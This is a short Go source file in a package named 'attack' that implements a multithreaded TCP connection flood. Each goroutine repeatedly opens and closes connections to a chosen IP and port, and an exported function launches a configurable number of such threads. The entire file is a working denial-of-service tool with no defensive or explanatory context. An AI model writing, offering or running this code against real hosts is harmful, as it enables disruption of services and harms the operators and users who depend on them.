package attack

import (
	"fmt"
	"net"
	"sync"
	"time"
)

func tcpFlood(ip string, port int, wg *sync.WaitGroup) {
	defer wg.Done()
	address := fmt.Sprintf("%s:%d", ip, port)
	for {
		conn, err := net.DialTimeout("tcp", address, 2*time.Second)
		if err != nil {
			fmt.Printf("[-] Failed to connect %s:%d: %v\n", ip, port, err)
			return
		}

		fmt.Printf("[++] Sent TCP request to %s\n", address)
		conn.Close()
	}
}

func TcpFlood(ip string, port int, threads int) {
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go tcpFlood(ip, port, &wg)
	}
	wg.Wait()
}
